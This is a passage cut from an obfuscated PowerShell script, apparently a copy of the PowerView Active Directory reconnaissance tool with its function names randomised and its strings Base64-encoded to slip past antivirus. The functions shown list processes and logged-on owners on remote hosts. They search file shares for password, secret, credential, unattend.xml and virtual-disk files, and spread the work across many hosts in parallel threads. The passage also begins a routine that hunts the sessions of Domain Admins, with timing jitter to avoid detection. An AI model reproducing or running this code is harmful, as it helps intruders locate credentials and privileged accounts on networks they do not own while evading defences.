                                ${c75072bac42044cfa630131a26986efd}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBNAG8AdQBuAHQAZQBkAEQAcgBpAHYAZQA='))))
                                ${c75072bac42044cfa630131a26986efd}
                            }
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIABFAHIAcgBvAHIAIABhAGMAYwBlAHMAcwBpAG4AZwAgACQAewBhADkAZQAxADQAOQBhADYAMgAyAGUAMQA0ADYAYwBiADgAYwA0AGMANgA5ADAAZgAyADgANgBiAGIANABiADAAfQAsACAAbABpAGsAZQBsAHkAIABpAG4AcwB1AGYAZgBpAGMAaQBlAG4AdAAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAgAG8AcgAgAGYAaQByAGUAdwBhAGwAbAAgAHIAdQBsAGUAcwAgAG8AbgAgAGgAbwBzAHQAOgAgACQAXwA=')))
            }
        }
    }
}
function ae175b7b5bd34afd960845c09ce62c83 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            try {
                ${37906835ebea442091202157613e9fa5} = @{
                    'ComputerName' = ${ac645935110b4eaea96e7bf6f0b2d7f4}
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${37906835ebea442091202157613e9fa5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                Get-WMIobject @37906835ebea442091202157613e9fa5 | ForEach-Object {
                    ${46c7c73d5bc54b95b05893f1879055e2} = $_.getowner();
                    ${50ae829e8660446facfe2f87590f8875} = New-Object PSObject
                    ${50ae829e8660446facfe2f87590f8875} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                    ${50ae829e8660446facfe2f87590f8875} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    ${50ae829e8660446facfe2f87590f8875} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    ${50ae829e8660446facfe2f87590f8875} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) ${46c7c73d5bc54b95b05893f1879055e2}.Domain
                    ${50ae829e8660446facfe2f87590f8875} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) ${46c7c73d5bc54b95b05893f1879055e2}.User
                    ${50ae829e8660446facfe2f87590f8875}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFAAcgBvAGMAZQBzAHMA'))))
                    ${50ae829e8660446facfe2f87590f8875}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFAAcgBvAGMAZQBzAHMAXQAgAEUAcgByAG8AcgAgAGUAbgB1AG0AZQByAGEAdABpAG4AZwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwBlAHMAIABvAG4AIAAnACQAewBhADkAZQAxADQAOQBhADYAMgAyAGUAMQA0ADYAYwBiADgAYwA0AGMANgA5ADAAZgAyADgANgBiAGIANABiADAAfQAnACwAIABhAGMAYwBlAHMAcwAgAGwAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
            }
        }
    }
}
function e688f334e90c44fe87244254417a3ffa {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${ae8ecd6e69404d9c9c6218754f5ced45},
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        ${aedc8c7c653d42d7a0d36c98fc095805},
        [Switch]
        ${b6ee2a9df5944cd78701f8b47e04e753},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} =  @{
            'Recurse' = $True
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            'Include' = $Include
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))]) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))]) {
            $LastAccessTime = (Get-Date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGMAbAB1AGQAZQA=')))] = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA=='))))
        }
        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAYwBlAA==')))] = -not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBIAGkAZABkAGUAbgA=')))]
        ${a7a08ce980304e968286c9b55cb03dc0} = @{}
        function db37ba71b9934b9496071aa6b95f4bec {
            [CmdletBinding()]Param([String]$Path)
            try {
                ${1a9dd55bca204288abfcdfbbf3d00c30} = [IO.File]::OpenWrite($Path)
                ${1a9dd55bca204288abfcdfbbf3d00c30}.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach (${f2c826b07a43443aaca3dc6e400f36f1} in $Path) {
            if ((${f2c826b07a43443aaca3dc6e400f36f1} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${a7323df48bb0410394bda78f8d71db4a} = (New-Object System.Uri(${f2c826b07a43443aaca3dc6e400f36f1})).Host
                if (-not ${a7a08ce980304e968286c9b55cb03dc0}[${a7323df48bb0410394bda78f8d71db4a}]) {
                    b62ba051179546ed8285f6844e069492 -ac645935110b4eaea96e7bf6f0b2d7f4 ${a7323df48bb0410394bda78f8d71db4a} -Credential $Credential
                    ${a7a08ce980304e968286c9b55cb03dc0}[${a7323df48bb0410394bda78f8d71db4a}] = $True
                }
            }
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${f2c826b07a43443aaca3dc6e400f36f1}
            Get-ChildItem @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
                ${96f7b4a58e4b412499f1415c9f838e94} = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBGAG8AbABkAGUAcgBzAA==')))] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    ${96f7b4a58e4b412499f1415c9f838e94} = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    ${96f7b4a58e4b412499f1415c9f838e94} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    ${96f7b4a58e4b412499f1415c9f838e94} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] -and ($_.CreationTime -lt $CreationTime)) {
                    ${96f7b4a58e4b412499f1415c9f838e94} = $False
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not (db37ba71b9934b9496071aa6b95f4bec -Path $_.FullName))) {
                    ${96f7b4a58e4b412499f1415c9f838e94} = $False
                }
                if (${96f7b4a58e4b412499f1415c9f838e94}) {
                    ${cc6392e3bb3a4ba0b152d92146247cfc} = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    ${e27ca82c416f4ed49a42aae7ab1aad78} = New-Object -TypeName PSObject -Property ${cc6392e3bb3a4ba0b152d92146247cfc}
                    ${e27ca82c416f4ed49a42aae7ab1aad78}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AdQBuAGQARgBpAGwAZQA='))))
                    ${e27ca82c416f4ed49a42aae7ab1aad78}
                }
            }
        }
    }
    END {
        ${a7a08ce980304e968286c9b55cb03dc0}.Keys | a7d442a86d1b4ceeaa8f4ca925e39550
    }
}
function afa7981a0a8840e7ae58b8e0c696a5d3 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        ${d8bca3485d0e4462855c0f18d0a8d91d},
        [Parameter(Position = 2)]
        [Hashtable]
        ${bf25cd70880740848c7344c3829474ee},
        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,
        [Switch]
        ${de43699c504147c49dbeea64093046c0}
    )
    BEGIN {
        ${f4d4d15971ee4f908c4d11aaa07369b5} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        ${f4d4d15971ee4f908c4d11aaa07369b5}.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not ${de43699c504147c49dbeea64093046c0}) {
            ${9ace8f5771494e59b4b731ecea2dae7f} = Get-Variable -Scope 2
            ${591e1eb0675543b78f918c0c8b31bcfc} = @('?',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach (${07663394fc014ceaa5c25251a4d2a6d9} in ${9ace8f5771494e59b4b731ecea2dae7f}) {
                if (${591e1eb0675543b78f918c0c8b31bcfc} -NotContains ${07663394fc014ceaa5c25251a4d2a6d9}.Name) {
                ${f4d4d15971ee4f908c4d11aaa07369b5}.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList ${07663394fc014ceaa5c25251a4d2a6d9}.name,${07663394fc014ceaa5c25251a4d2a6d9}.Value,${07663394fc014ceaa5c25251a4d2a6d9}.description,${07663394fc014ceaa5c25251a4d2a6d9}.options,${07663394fc014ceaa5c25251a4d2a6d9}.attributes))
                }
            }
            ForEach (${e7e9fce15fc7451ca8f4f45b6fd97555} in (Get-ChildItem Function:)) {
                ${f4d4d15971ee4f908c4d11aaa07369b5}.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList ${e7e9fce15fc7451ca8f4f45b6fd97555}.Name, ${e7e9fce15fc7451ca8f4f45b6fd97555}.Definition))
            }
        }
        ${abc6a932449245fdad9ad5a32569e86a} = [RunspaceFactory]::CreateRunspacePool(1, $Threads, ${f4d4d15971ee4f908c4d11aaa07369b5}, $Host)
        ${abc6a932449245fdad9ad5a32569e86a}.Open()
        $Method = $Null
        ForEach (${ef0b6b30ec374bd2b6423d35b352a21e} in [PowerShell].GetMethods() | Where-Object { $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            ${4a74af0c38e841b2b1d361fb61df6ee1} = ${ef0b6b30ec374bd2b6423d35b352a21e}.GetParameters()
            if ((${4a74af0c38e841b2b1d361fb61df6ee1}.Count -eq 2) -and ${4a74af0c38e841b2b1d361fb61df6ee1}[0].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))) -and ${4a74af0c38e841b2b1d361fb61df6ee1}[1].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                $Method = ${ef0b6b30ec374bd2b6423d35b352a21e}.MakeGenericMethod([Object], [Object])
                break
            }
        }
        ${43b4d7f77b974afeb02768d943c83a2a} = @()
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = ${ac645935110b4eaea96e7bf6f0b2d7f4} | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $(${ac645935110b4eaea96e7bf6f0b2d7f4}.count)"
        if ($Threads -ge ${ac645935110b4eaea96e7bf6f0b2d7f4}.Length) {
            $Threads = ${ac645935110b4eaea96e7bf6f0b2d7f4}.Length
        }
        ${6a5ba25e16984a74a89953535e861b19} = [Int](${ac645935110b4eaea96e7bf6f0b2d7f4}.Length/$Threads)
        ${cdc1d5ee206d4351af34960d8ce6a387} = @()
        ${2c9773616df74388b8be3090c322c710} = 0
        ${1df95a68704441238e24d195aa00914c} = ${6a5ba25e16984a74a89953535e861b19}
        for(${35c58f1556d947ac8053e2f546574b9e} = 1; ${35c58f1556d947ac8053e2f546574b9e} -le $Threads; ${35c58f1556d947ac8053e2f546574b9e}++) {
            ${af61f49756484e779da6d251d05357dd} = New-Object System.Collections.ArrayList
            if (${35c58f1556d947ac8053e2f546574b9e} -eq $Threads) {
                ${1df95a68704441238e24d195aa00914c} = ${ac645935110b4eaea96e7bf6f0b2d7f4}.Length
            }
            ${af61f49756484e779da6d251d05357dd}.AddRange(${ac645935110b4eaea96e7bf6f0b2d7f4}[${2c9773616df74388b8be3090c322c710}..(${1df95a68704441238e24d195aa00914c}-1)])
            ${2c9773616df74388b8be3090c322c710} += ${6a5ba25e16984a74a89953535e861b19}
            ${1df95a68704441238e24d195aa00914c} += ${6a5ba25e16984a74a89953535e861b19}
            ${cdc1d5ee206d4351af34960d8ce6a387} += @(,@(${af61f49756484e779da6d251d05357dd}.ToArray()))
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAbwB0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAdABoAHIAZQBhAGQAcwAvAHAAYQByAHQAaQB0AGkAbwBuAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
        ForEach (${fa436acf6ef044aca9d2b7bbe12505c4} in ${cdc1d5ee206d4351af34960d8ce6a387}) {
            ${06e6dfd7f7da4ce3a041f3e050f9bea4} = [PowerShell]::Create()
            ${06e6dfd7f7da4ce3a041f3e050f9bea4}.runspacepool = ${abc6a932449245fdad9ad5a32569e86a}
            $Null = ${06e6dfd7f7da4ce3a041f3e050f9bea4}.AddScript(${d8bca3485d0e4462855c0f18d0a8d91d}).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), ${fa436acf6ef044aca9d2b7bbe12505c4})
            if (${bf25cd70880740848c7344c3829474ee}) {
                ForEach (${ce2d005ff3524e5d9652c94fbdb49be6} in ${bf25cd70880740848c7344c3829474ee}.GetEnumerator()) {
                    $Null = ${06e6dfd7f7da4ce3a041f3e050f9bea4}.AddParameter(${ce2d005ff3524e5d9652c94fbdb49be6}.Name, ${ce2d005ff3524e5d9652c94fbdb49be6}.Value)
                }
            }
            ${b01c344f140447efaf17619a650a69ed} = New-Object Management.Automation.PSDataCollection[Object]
            ${43b4d7f77b974afeb02768d943c83a2a} += @{
                PS = ${06e6dfd7f7da4ce3a041f3e050f9bea4}
                Output = ${b01c344f140447efaf17619a650a69ed}
                Result = $Method.Invoke(${06e6dfd7f7da4ce3a041f3e050f9bea4}, @($Null, [Management.Automation.PSDataCollection[Object]]${b01c344f140447efaf17619a650a69ed}))
            }
        }
    }
    END {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAaAByAGUAYQBkAHMAIABlAHgAZQBjAHUAdABpAG4AZwA=')))
        Do {
            ForEach (${e10f28a7c9f54d9299d9ecd32be8a12d} in ${43b4d7f77b974afeb02768d943c83a2a}) {
                ${e10f28a7c9f54d9299d9ecd32be8a12d}.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While ((${43b4d7f77b974afeb02768d943c83a2a} | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        ${ba59c47bc7e7456eb749c5147bde40cc} = 100
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFcAYQBpAHQAaQBuAGcAIAAkAHsAYgBhADUAOQBjADQANwBiAGMANwBlADcANAA1ADYAZQBiADcANAA5AGMANQAxADQANwBiAGQAZQA0ADAAYwBjAH0AIABzAGUAYwBvAG4AZABzACAAZgBvAHIAIABmAGkAbgBhAGwAIABjAGwAZQBhAG4AdQBwAC4ALgAuAA==')))
        for (${35c58f1556d947ac8053e2f546574b9e}=0; ${35c58f1556d947ac8053e2f546574b9e} -lt ${ba59c47bc7e7456eb749c5147bde40cc}; ${35c58f1556d947ac8053e2f546574b9e}++) {
            ForEach (${e10f28a7c9f54d9299d9ecd32be8a12d} in ${43b4d7f77b974afeb02768d943c83a2a}) {
                ${e10f28a7c9f54d9299d9ecd32be8a12d}.Output.ReadAll()
                ${e10f28a7c9f54d9299d9ecd32be8a12d}.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        ${abc6a932449245fdad9ad5a32569e86a}.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAGEAbABsACAAdABoAHIAZQBhAGQAcwAgAGMAbwBtAHAAbABlAHQAZQBkAA==')))
    }
}
function Find-DomainUserLocation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
